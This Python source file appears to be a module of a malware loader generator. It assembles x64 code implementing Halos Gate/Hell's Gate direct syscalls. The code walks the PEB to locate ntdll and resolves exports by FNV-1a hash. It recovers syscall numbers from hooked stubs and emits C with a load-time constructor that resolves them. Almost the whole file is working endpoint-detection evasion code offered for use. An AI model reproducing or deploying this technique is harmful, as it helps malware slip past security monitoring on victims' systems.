import random
import string
import tempfile
import os
import subprocess
from c.utils.typedefs import typedefs

class halosgatehash:
    def __init__(self, arguments):
        self.name = ''.join(random.SystemRandom().choice(string.ascii_lowercase) for _ in range(16))
        self.handle = 'LoadLibrary'
        if 'handle' in arguments:
            if arguments['handle'] in ['LoadLibrary', 'GetModuleHandleA']:
                self.handle = arguments['handle']
            else:
                print("Handle must be either LoadLibrary or GetModuleHandleA")
                exit(0)
        fd, file_path = tempfile.mkstemp(suffix='.asm')
        self.outfd, self.outfile_path = tempfile.mkstemp(suffix='.o')
        self.typedefs = typedefs
        with os.fdopen(fd, 'w') as f:
            inline_assembly = """
bits 64
section .text
global getntdll
global getExportTable
global getExAddressTable
global getExNamePointerTable
global getExOrdinalTable
global getApiAddr
global findSyscallNumber
global halosGateUp
global halosGateDown
global HellsGate
global HellDescent

getntdll:
    xor rax, rax                ; zero RAX only, no RDI involved
    mov rcx, [gs:rax+60h]       ; PEB
    mov rcx, [rcx+18h]          ; PEB->Ldr
    mov rcx, [rcx+20h]          ; InMemoryOrderModuleList.Flink
    mov rcx, [rcx]              ; second entry (ntdll)
    mov rcx, [rcx+20h]          ; DllBase
    mov rax, rcx
    ret


; Get ExportTable Address of supplied module DLL
getExportTable:
    push rbx
	mov rbx, rcx            ; RBX = Supplied Module Address
	mov r8, rcx             ; R8  = Supplied Module Address
	mov ebx, [rbx+3Ch]      ; RBX = Offset NewEXEHeader
	add rbx, r8             ; RBX = &ntdll.dll + Offset NewEXEHeader = &NewEXEHeader
	xor rcx, rcx            ; Avoid null bytes from mov edx,[rbx+0x88] by using rcx register to add
	add cx, 88ffh
	shr rcx, 8h             ; RCX = 0x88ff --> 0x88
	mov edx, [rbx+rcx]      ; EDX = [&NewEXEHeader + Offset RVA ExportTable] = RVA ExportTable
	add rdx, r8             ; RDX = &ntdll.dll + RVA ExportTable = &ExportTable
	mov rax, rdx            ; RAX = &module.ExportTable
    pop rbx
	ret                     ; return to caller


; Get &module.ExportTable.AddressTable from &module.ExportTable
getExAddressTable:
    push rbx
	mov r8, rdx             ; R8  = &module.dll
	mov rdx, rcx            ; RDX = &module.ExportTable
	xor r10, r10
	mov r10d, [rdx+1Ch]     ; RDI = RVA AddressTable
	add r10, r8             ; R10 = &AddressTable
	mov rax, r10            ; RAX = &module.ExportTable.AddressTable
    pop rbx
	ret                     ; return to caller

; Get &module.NamePointerTable from &module.ExportTable
getExNamePointerTable:
    push rbx
	mov r8, rdx             ; R8  = &module.dll
	mov rdx, rcx            ; RDX = &module.ExportTable
	xor r11, r11
	mov r11d, [rdx+20h]     ; R11 = [&ExportTable + Offset RVA Name PointerTable] = RVA NamePointerTable
	add r11, r8             ; R11 = &NamePointerTable (Memory Address of module Export NamePointerTable)
	mov rax, r11            ; RAX = &module.ExportTable.NamePointerTable
    pop rbx
	ret                     ; return to caller

; Get &OrdinalTable from ntdll.dll ExportTable
getExOrdinalTable:
    push rbx
	mov r8, rdx             ; R8  = &module.dll
	mov rdx, rcx            ; RDX = &module.ExportTable
	xor r10, r10
	mov r10d, [rdx+24h]     ; R12 = RVA  OrdinalTable
	add r10, r8             ; R12 = &OrdinalTable
	mov rax, r10            ; RAX = &module.ExportTable.OrdinalTable
    pop rbx
	ret                     ; return to caller

; Get the address of the API from the module ExportTable
; IN: &Module.ExportTable.NamePointerTable + &Module
getApiAddr:
	mov r10, r9             ; R10 = &module.ExportTable.AddressTable
	mov r11, [rsp+28h]      ; R11 = &module.ExportTable.NamePointerTable
	mov r9, [rsp+30h]       ; R9  = &OrdinalTable (r9 is free after the copy)
	xor rax, rax            ; RAX = name index counter
	jmp short getApiAddrLoop

getApiAddrLoop:
	mov ecx, [r11+rax*4]    ; ECX = RVA NameString (rcx is free scratch)
	add rcx, r8             ; RCX = &NameString

	push rax                ; hash loop clobbers eax
	push rdx                ; hash loop clobbers rdx

	mov eax, 0x811C9DC5     ; FNV-1a offset basis
	mov rdx, rcx

hash_compare:
	movzx ecx, byte [rdx]
	test ecx, ecx
	jz hash_done
	xor eax, ecx
	imul eax, eax, 0x01000193
	inc rdx
	jmp short hash_compare

hash_done:
	pop rdx                 ; restore hash param
	cmp eax, edx            ; match?
	pop rax                 ; restore counter (pop doesn't touch flags)
	je getApiAddrFin

	inc rax
	jmp short getApiAddrLoop

getApiAddrFin:
	movzx eax, word [r9+rax*2]  ; EAX = ordinal (movzx clears upper bits too)
	mov eax, [r10+rax*4]         ; EAX = RVA of API
	add rax, r8                 ; RAX = &module.API
	ret

; Find the syscall number for the NTDLL API with provided API address
; RCX = NTDLL.<API> Address
findSyscallNumber:
	mov r10d, 00B8D18B4Ch    ; "4C 8B D1 B8" = mov r10,rcx ; mov eax,...
	mov r11d, [rcx]
	cmp r10d, r11d
	jne error
	movzx eax, word [rcx+4]
	ret

; RCX = &NTDLL.<API> | RDX = 32bytes * Up Increment
halosGateUp:
	mov  r10, 00B8D18B4Ch   ; signature in a VOLATILE register
	xor  rax, rax
	mov  al, 20h
	mul  dx
	add  rcx, rax
	mov  r11d, [rcx]        ; VOLATILE scratch
	cmp  r10d, r11d
	jne  error
	xor  rax, rax
	mov  ax, [rcx+4]
	ret

halosGateDown:
	mov  r10, 00B8D18B4Ch
	xor  rax, rax
	mov  al, 20h
	mul  dx
	sub  rcx, rax
	mov  r11d, [rcx]
	cmp  r10d, r11d
	jne  error
	xor  rax, rax
	mov  ax, [rcx+4]
	ret

error:
	xor rax, rax ; return 0 for error
	ret          ; return to caller

HellsGate:
	xor r11, r11
	mov r11d, ecx
	ret

HellDescent:
	xor rax, rax
	mov r10, rcx
	mov eax, r11d
	syscall
	ret
"""
            f.write(inline_assembly)
        result = subprocess.run(['nasm', '-f', 'win64', file_path, '-o', self.outfile_path])
        os.unlink(file_path)

    def imports(self) -> list[str]:
        return ['#include <windows.h>']

    def compilerOptions(self) -> list[str]:
        return [self.outfile_path]
    
    def codeblocks(self) -> str:
        ntdll = []
        codeblock = ''
        for apicall in self.apicalls:
            if apicall[0:2] == 'Nt':
                ntdll.append(apicall)
            elif apicall[0:2] in ['Zw', 'Rt']:
                codeblock += f"""
{self.typedefs[apicall]}
"""

        codeblock += f"""
extern VOID HellsGate(WORD wSystemCall);
extern NTSTATUS HellDescent(...);

EXTERN_C PVOID getntdll();

EXTERN_C PVOID getExportTable(
	IN PVOID moduleAddr
);

EXTERN_C PVOID getExAddressTable(
	IN PVOID moduleExportTableAddr,
	IN PVOID moduleAddr
);

EXTERN_C PVOID getExNamePointerTable(
	IN PVOID moduleExportTableAddr,
	IN PVOID moduleAddr
);

EXTERN_C PVOID getExOrdinalTable(
	IN PVOID moduleExportTableAddr,
	IN PVOID moduleAddr
);

EXTERN_C PVOID getApiAddr(
	IN DWORD apiNameStringLen,
	IN DWORD apiNameHash,
	IN PVOID moduleAddr,
	IN PVOID ExExAddressTable,
	IN PVOID ExNamePointerTable,
	IN PVOID ExOrdinalTable
);

EXTERN_C DWORD findSyscallNumber(
	IN PVOID ntdllApiAddr
);

EXTERN_C DWORD halosGateUp(
	IN PVOID ntdllApiAddr,
	IN WORD index
);

EXTERN_C DWORD halosGateDown(
	IN PVOID ntdllApiAddr,
	IN WORD index
);

typedef struct {{
    {'\n\t'.join([f'DWORD {x}_ssn;' for x in ntdll ])}
}} Resolver;

Resolver resolver;

DWORD halosGate(PVOID apiAddr){{
	DWORD syscallNumber = 0;
	syscallNumber = findSyscallNumber(apiAddr);
	if (syscallNumber == 0){{
		DWORD index = 0;
        while (syscallNumber == 0){{
			index++;
			syscallNumber = halosGateUp(apiAddr, index);
			if (syscallNumber){{
				syscallNumber = syscallNumber - index;
				break;
			}}
			syscallNumber = halosGateDown(apiAddr, index);
			if (syscallNumber){{
				syscallNumber = syscallNumber + index;
				break;
			}}    
		}}  
	}}
	return syscallNumber;
    
}}

NTSTATUS status = 0;

__attribute__((constructor)) void {self.name}(){{

	PVOID ntdll = NULL;
	PVOID ntdllExportTable = NULL;

	PVOID ntdllExAddrTbl = NULL;
	PVOID ntdllExNamePtrTbl = NULL;
	PVOID ntdllExOrdinalTbl = NULL;

    ntdll = getntdll();
    ntdllExportTable = getExportTable(ntdll);
    ntdllExAddrTbl = getExAddressTable(ntdllExportTable, ntdll);
    ntdllExNamePtrTbl = getExNamePointerTable(ntdllExportTable, ntdll);
    ntdllExOrdinalTbl = getExOrdinalTable(ntdllExportTable, ntdll);
    {'\n\t'.join([f'resolver.{apicall}_ssn = halosGate(getApiAddr({len(apicall)}, {self.hashstring(apicall)}, ntdll, ntdllExAddrTbl, ntdllExNamePtrTbl, ntdllExOrdinalTbl));' for apicall in ntdll])}
}}
"""
        return codeblock


    def resolve(self, apicalls):
        resolved = {}
        self.apicalls = apicalls
        for apicall in apicalls:
            if apicall[0:2] == 'Nt':
                resolved[apicall] = f"""
	HellsGate(resolver.{apicall}_ssn);
	HellDescent"""
            elif apicall[0:2] in ['Rt', 'Zw']:
                resolved[apicall] = f'(({apicall}_t)GetProcAddress(LoadLibrary(TEXT("ntdll.dll")), "{apicall}"))'
            else:
                resolved[apicall] = apicall
        return resolved

    def hashstring(self, functionName) -> int:
        value = 0x811C9DC5

        for character in functionName:
            if character == 0:
                break
            value = ((value ^ ord(character)) * 0x01000193) & 0xFFFFFFFF

        return value